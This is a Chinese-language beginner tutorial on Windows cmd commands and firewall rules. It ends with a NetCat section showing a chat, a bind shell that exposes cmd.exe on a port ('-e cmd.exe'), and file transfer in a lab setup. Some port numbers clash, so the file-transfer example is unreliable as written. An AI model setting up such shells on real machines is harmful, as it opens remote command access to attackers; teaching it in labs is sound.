## **环节一：了解操作系统**

### **什么是操作系统？**

操作系统*（缩写：OS）*是一种**手机、电脑**内置的程序，用来协作各种硬件，以与用户进行交互。

### **生活中有哪些操作系统？**

电脑常见有： Windows，macOS 、开源的 Linux、华为鸿蒙系统。

手机常见有：Android（谷歌开发）、iOS（苹果公司开发）鸿蒙操作系统 。

### **window的目录结构？**

- **目录结构像** **多颗** **倒挂的树**（拥有1~N个磁盘）
- **路径的起点是盘符**，例如C盘，D盘等。
- 绝对路径地址描述语法： 盘符:\下级目录\文件名称.后缀（以盘符开始）

- 例如： **E:\test1\demo1.txt** ，表示E盘内有test1文件夹，内有demo1.txt文件

### **一** **、系统信息和配置**（了解）

1. systeminfo ：显示详细的系统信息，包括操作系统版本、硬件配置、补丁安装情况等。
2. winver ：显示Windows的版本信息。
3. msinfo32 ：打开系统信息窗口，提供关于系统硬件和软件配置的详细信息。
4. sfc  /scannow ：扫描并修复系统文件，确保Windows系统的完整性和稳定性。

### **二、文件和目录管理**（重要）

1. dir：列出当前目录下的文件和文件夹列表。展示这个目录下面的所有的文件以及文件夹
2. cd：更改当前目录，可以切换到其他文件夹。例如，cd \切换到根目录，cd 文件夹名切换到指定文件夹。

```
//进入某个磁盘(磁盘名称：)
d:     
//跳转到硬盘的根目录
cd \       
//跳转到当前硬盘的其他文件
cd  C:\Users 
//跳转到上一层目录
cd..      
```

1. md（mkdir）：创建新文件夹。例如，md 新文件夹名。
2. rd（rmdir）：删除文件夹，但只能删除空文件夹。例如，rd 文件夹名。

```
//创建目录
md 目录名（文件夹）
 
//删除目录
rd 目录名（文件夹）
```

1. del：删除文件。例如，del 文件名.txt。
2. copy：复制文件。例如，copy  源文件 目标文件。
3. xcopy：复制文件夹。例如，xcopy  源文件夹 目标文件夹。
4. move : 把一个文件移动到另一个地方。移动就是剪切

```
// 把一个文件拷贝到另一个地方。 
copy   路径\文件名   路径\文件名
 
// 把一个文件移动（就是剪切+复制）到另一个地方。 
move   路径\文件名   路径\文件名 
 
//这个是专门删除文件的，不能删除文件夹
del 文件名
```

1. ren（rename）：重命名文件或文件夹。例如，ren 旧文件名 新文件名。 （不管是文件夹 还是文件 操作都可以）
2. type：显示文件的内容。例如，type 文件名.txt。

 

### **三、网络配置和诊断****（比较重要）**

1. ipconfig：显示网络配置信息，包括IP地址、子网掩码、默认网关等。（插网线的看以太网  用wifi的看无线局域网）
2. ping：向指定的IP地址或域名发送网络请求，用于测试网络连接。
3. netstat：显示网络连接和端口状态，帮助诊断网络问题。（按ctrl+c停止）

**四、系统管理和维护**（作为了解）

1. services.msc：打开本地服务设置，可以启动、停止和管理Windows服务。
2. taskmgr：打开任务管理器，可以查看和管理正在运行的进程、性能等。
3. compmgmt.msc：计算机管理，包括设备管理器、磁盘管理、服务、事件查看器等。
4. cleanmgr：【一般不建议随意操作】打开磁盘清理工具，可以清理不必要的文件和系统临时文件。

**五、系统安全和账户管理**（了解）

1. regedit（或regedt32）：【暂时不要随意修改】注册表编辑器，可以修改Windows注册表项。

**六、其他实用命令**（了解）

1. cls: 清除屏幕（记住）
2. calc：启动计算器。
3. notepad：打开记事本。
4. osk：打开屏幕键盘。
5. mstsc：远程桌面连接。
6. eventvwr：事件查看器，用于查看和管理系统日志。
7. perfmon（或perfmon.msc）：计算机性能监测器，可以监控CPU、内存、磁盘等性能。

**七、关机和重启****【建议使用win2012虚拟机操作】（了解）

1. shutdown  /s ：关闭计算机。
2. shutdown  /r ：重启计算机。

**八、windows核心命令 -** **用户管理【建议使用win2012虚拟机操作】**

**在Windows系统中，通过命令行（特别是使用**net user命令）来管理用户账户是一个常见的做法。**

> **什么是防火墙？**
>
> 防火墙是计算中的**网络安全系统**，用于监控和过滤传入和传出的网络流量。 防火墙还负责阻止或允许某些数据包进入您的网络。 就像一堵墙，防火墙是您的网络和外部资源之间的屏障。
>
> ​        就像防病毒软件一样，防火墙可以提高系统的安全性。 但是，防火墙与防病毒软件有很大不同。 防病毒软件会扫描现有文件中的病毒，而防火墙会首先阻止病毒进入系统。
>
> 电脑： 学校
>
> 防火墙： 学校的安保-用围墙围起来-门口保安去控制学校人员进出

**出入站规则：**

- 规则生效的前提是**防火墙处于开启状态**。

1. **规则介绍**

　　windows系统默认的规则：默认阻止入站连接，默认允许出站连接。

​       也就是说，凡是入站连接，任何程序和端口都要在防火墙上配置入站规则，否则都会被禁止。

　　*查看方式：控制控制面板-系统和安全-Windows Defender 防火墙-高级设置-windows Defender 防火墙属性*

**入站规则**

​	**入站规则是指通过网络访问信息系统时所采取的安全措施**，它通常包括防火墙、入侵检测系统、防病毒系统、访问控制列表（ACL）和其他安全设备。**入站规则的主要目的是防止未经授 权的网络流量进入网络，并阻止传播恶意代码、垃圾邮件和其他危害安全的流量**。

理解：入站规则是用来限制远程主机访问本机的服务的，就是说，本机接收的请求中如果被请求的程序或具体端口是被限制的，该请求被拦截。

 **出站规则**

​	**出站规则是指在内部网络内部向外部发送数据时所采取的安全措施**。**出站规则的主要目的是防止未经授权的网络流量从内部网络发出，以及防止数据泄露**。出站规则一般包括访问控制列表（ACL）、加密、防病毒和其他安全设备。

理解：出则规则使用来限制对外访问的，也就是说从本机发出的请求中，如果请求的对象是被禁止的，该请求会被拦截，表现方式就是断网。

规则有两种设置方式，程序和端口。具体可以设置允许连接和阻止连接。

- 对程序设置阻止连接后，该程序发出的所有请求都会被拦截，表现形式就是断网。如果对所有程序设置阻止连接那么所有程序都会被断网。
- 对端口设置阻止连接后，本机向外的请求中，如果请求的远程服务器端口是设置的端口，那么请求会被拦截。可以设置所有端口，那么所有请求都会被拦截。

 (搜索防火墙，查看入站规则还有出站规则里面的一些信息)

 

## **环节四、瑞士军刀**

NetCat是一款用于读写网络连接的工具，简称'nc'，有着 网络安全界"瑞士军刀" 的美称。它使用 TCP 或 UDP 协议，可以创建 TCP/UDP 流和监听来自这些流的输入。是一个好用稳定的连接系统后门的工具，同时也是一个网络调试和开发工具

﻿![img](https://gitee.com/lao-jiang-next-door/images/raw/master/13976)

 

**一、参数（了解即可）**

**NetCat本身是一个功能强大的网络工具，能够执行多种任务，包括端口扫描、数据传输、监听等。以下是一些常用选项。**

-l：开启监听

-p：指定端口

-e：程序重定向

-n：以数字形式标识 IP

-v：显示执行命令过程

-z：不进行交互，直接显示结果

-u：使用 UDP 协议传输

-w：设置超时时间

-d: 后台运行

**二、基础使用 **  （如果出现 nc.exe不是内部或者外部命令 环境变量没有配置好）

**使用NetCat（nc）工具在Windows环境下创建一个简单的TCP网络连接的例子。**

**1、简单聊天【客户端-服务器通信】**

**新开两个窗口，一个用于模拟服务端，一个用于模拟客户端**

192.168.2.47

![image-20250719154648104](https://gitee.com/lao-jiang-next-door/images/raw/master/image-20250719154648104.png)

**聊天**

![image-20250719154737381](https://gitee.com/lao-jiang-next-door/images/raw/master/image-20250719154737381.png)

**代码解析**

**服务端代码：**

```
nc64 -lp 7890
```

**nc64.exe：**这是NetCat工具的Windows可执行文件。

**-l：**这个选项告诉NetCat以监听模式运行，即它将在指定的端口上等待传入的连接请求。

**-p 7890：**这个选项指定了NetCat要监听的端口号，这里是5566。端口号是一个16位的数字，用于区分同一台计算机上运行的不同网络服务。

**客户端代码：**

```
nc64.exe  192.168.2.47 7890
```

**nc.exe ：**是NetCat工具的Windows可执行文件。

**192.168.2.47：**这是IP地址

**7890：**这是目标端口号，与服务端监听的端口号相同。客户端将尝试连接到这个端口。

**工作流程：**

1、当你在服务端运行nc64 -lp 7890时，NetCat将在端口7890上监听传入的连接请求。

2、随后，当你在客户端运行nc64.exe  192.168.2.47 7890时，NetCat将尝试连接到本地计算机的7890端口。

3、一旦连接建立，你就可以在服务端和客户端之间发送和接收数据了。在这个简单的例子中，你可以在客户端输入文本，它将被发送到服务端，并在服务端的NetCat窗口中显示。同样，服务端发送的任何文本也将显示在客户端的NetCat窗口中。

  ctrl+c退出

**2、正向返回shell**

**新开两个窗口，一个用于模拟服务端，一个用于模拟客户端**

**正向返回shell**

![image-20250719155808072](https://gitee.com/lao-jiang-next-door/images/raw/master/image-20250719155808072.png)

**代码解析**

**本机代码：**

```
nc64 -lp 7890 -e cmd.exe
```

**nc.exe：**NetCat工具的Windows可执行文件。

**-l：**以监听模式运行。

**-p 7890：**指定监听端口为7890。

**-e cmd.exe：**这是Windows特有的一个选项（不是所有版本的NetCat都支持），它告诉NetCat在接收到连接时，将输入/输出重定向到cmd.exe（命令提示符）。这意味着一旦连接建立，客户端就可以通过该连接与服务器上的命令提示符进行交互。

**虚拟机代码（应用服务端的cmd）：**

```
nc64.exe  192.168.2.47 7890
# ip地址要改成自己的
```

**工作流程：**

1、服务端运行nc64 -lp 7890 -e cmd.exe，在端口7890上监听传入的连接，并将接收到的任何输入重定向到cmd.exe。

2、客户端运行nc64.exe  192.168.2.47 7890，尝试连接到本地主机的7890端口。

3、一旦连接建立，客户端就可以开始输入命令，这些命令将被发送到服务端的cmd.exe进程并执行。服务端cmd.exe的输出也将通过连接发送回客户端。



**3、文件传输**（做个了解，我们后面有更好的文件传输工具 ）

- 客户端传服务器**（提前在无中文、无空格与特殊符号的路径下，新建server.txt 、clear.txt，其中 clear.txt 中写入任意内容）**

```
# 本机 启动监听，获取的数据写入server.txt
nc64 -lp 5566 >server.txt

# 虚拟机 读取clear.txt的数据
nc64.exe 192.168.2.47 7890 <clear.txt
```
